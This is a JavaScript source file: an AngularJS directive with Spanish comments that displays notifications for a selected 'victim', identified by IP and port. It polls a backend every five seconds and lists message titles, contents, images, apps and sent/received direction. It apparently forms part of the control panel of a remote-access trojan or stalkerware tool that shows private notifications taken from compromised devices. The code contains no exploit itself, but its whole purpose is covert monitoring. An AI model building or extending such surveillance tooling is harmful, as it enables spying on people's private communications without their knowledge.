// Directiva de notificaciones para AngularJS, usando el módulo principal "myappy"
angular.module('myappy')
  .directive('labNotifi', function() {
    return {
      restrict: 'E',
      scope: {
        victim: '='
      },
      template: `
        <div class="notifi-container">
          <div class="notifi-toolbar">
            <div class="ui icon input notifi-search">
              <input type="text" placeholder="Buscar por título o contenido…" ng-model="searchQuery">
              <i class="search icon"></i>
            </div>
            <span class="notifi-count ui label" ng-if="!loading">
              {{ filteredCount }} notificación(es)
            </span>
          </div>

          <div ng-if="loading" class="ui active centered inline loader" style="margin:20px auto;display:block;"></div>
          <div ng-if="error" class="ui red message">{{ error }}</div>

          <div ng-if="!loading && filteredCount === 0 && !error" class="ui placeholder segment notifi-empty">
            <div class="ui icon header">
              <i class="bell outline icon"></i>
              No hay notificaciones disponibles.
            </div>
          </div>

          <div ng-repeat="group in dateGroups track by group.label" ng-if="group.notifications.length > 0">
            <div class="notifi-date-label">
              <span class="ui horizontal divider">
                <i class="calendar outline icon"></i> {{ group.label }}
              </span>
            </div>

            <div class="ui cards notifi-cards">
              <div class="card notifi-card"
                   ng-repeat="notif in group.notifications track by $index"
                   ng-show="matchesSearch(notif)">
                <div class="content">
                  <div class="header notifi-card-header">
                    <i class="bell outline icon notifi-bell-icon"></i>
                    <span class="notifi-title">{{ notif.title || '(sin título)' }}</span>
                    <span ng-if="notif.direction === 'sent'"
                          class="ui tiny green label notifi-dir-badge">
                      <i class="arrow up icon"></i> Enviado
                    </span>
                    <span ng-if="notif.direction === 'received'"
                          class="ui tiny blue label notifi-dir-badge">
                      <i class="arrow down icon"></i> Recibido
                    </span>
                  </div>
                  <div class="meta notifi-meta">
                    <i class="clock outline icon"></i>
                    {{ notif.time | date:'dd/MM/yyyy HH:mm' }}
                    <span ng-if="notif.app" class="notifi-app-tag">
                      &nbsp;·&nbsp;<i class="tag icon"></i> {{ notif.app }}
                    </span>
                  </div>
                  <div class="description notifi-body" ng-if="notif.content">
                    <span ng-if="!notif._expanded && notif.content.length > 160">
                      {{ notif.content | limitTo:160 }}…
                      <a class="notifi-toggle" ng-click="notif._expanded = true">Ver más</a>
                    </span>
                    <span ng-if="notif._expanded || notif.content.length <= 160">
                      {{ notif.content }}
                      <a class="notifi-toggle" ng-if="notif._expanded" ng-click="notif._expanded = false"> Ver menos</a>
                    </span>
                  </div>
                  <div ng-if="notif.image" class="notifi-image-wrap">
                    <img ng-src="{{ notif.image }}" alt="imagen" class="notifi-image">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `,
      controller: function($scope, $http, $interval) {
        $scope.notifications = [];
        $scope.dateGroups = [];
        $scope.loading = false;
        $scope.error = "";
        $scope.searchQuery = "";
        $scope.filteredCount = 0;

        var DATE_LABELS = { TODAY: 'Hoy', YESTERDAY: 'Ayer', EARLIER: 'Anteriores' };

        function getDateLabel(timeStr) {
          var now = new Date();
          var d = new Date(timeStr);
          if (isNaN(d)) return DATE_LABELS.EARLIER;
          var todayStr = now.toDateString();
          var yesterday = new Date(now);
          yesterday.setDate(yesterday.getDate() - 1);
          if (d.toDateString() === todayStr) return DATE_LABELS.TODAY;
          if (d.toDateString() === yesterday.toDateString()) return DATE_LABELS.YESTERDAY;
          return DATE_LABELS.EARLIER;
        }

        function groupByDate(notifs) {
          var order = [DATE_LABELS.TODAY, DATE_LABELS.YESTERDAY, DATE_LABELS.EARLIER];
          var map = {};
          order.forEach(function(lbl) { map[lbl] = []; });
          notifs.forEach(function(n) {
            var lbl = getDateLabel(n.time);
            map[lbl].push(n);
          });
          return order.map(function(lbl) {
            return { label: lbl, notifications: map[lbl] };
          });
        }

        $scope.matchesSearch = function(notif) {
          var q = ($scope.searchQuery || '').toLowerCase().trim();
          if (!q) return true;
          var title = (notif.title || '').toLowerCase();
          var content = (notif.content || '').toLowerCase();
          return title.indexOf(q) !== -1 || content.indexOf(q) !== -1;
        };

        function updateFilteredCount() {
          var count = 0;
          $scope.notifications.forEach(function(n) {
            if ($scope.matchesSearch(n)) count++;
          });
          $scope.filteredCount = count;
        }

        $scope.$watch('searchQuery', function() {
          updateFilteredCount();
        });

        function fetchNotifications() {
          if (!$scope.victim) return;
          $scope.loading = true;
          $scope.error = "";
          var victimId = ($scope.victim && $scope.victim.id)
            ? $scope.victim.id
            : (($scope.victim.ip && $scope.victim.port)
                ? ($scope.victim.ip + ":" + $scope.victim.port)
                : $scope.victim);
          victimId = String(victimId).trim();

          $http.get('/api/notifications/' + victimId).then(function(response) {
            var raw = (response.data || []).slice().sort(function(a, b) {
              return new Date(b.time) - new Date(a.time);
            });
            $scope.notifications = raw;
            $scope.dateGroups = groupByDate(raw);
            updateFilteredCount();
            $scope.loading = false;
          }, function() {
            $scope.error = "No se pudieron cargar las notificaciones.";
            $scope.loading = false;
          });
        }

        fetchNotifications();
        var intervalPromise = $interval(fetchNotifications, 5000);

        $scope.$on('$destroy', function() {
          $interval.cancel(intervalPromise);
        });
      }
    };
  });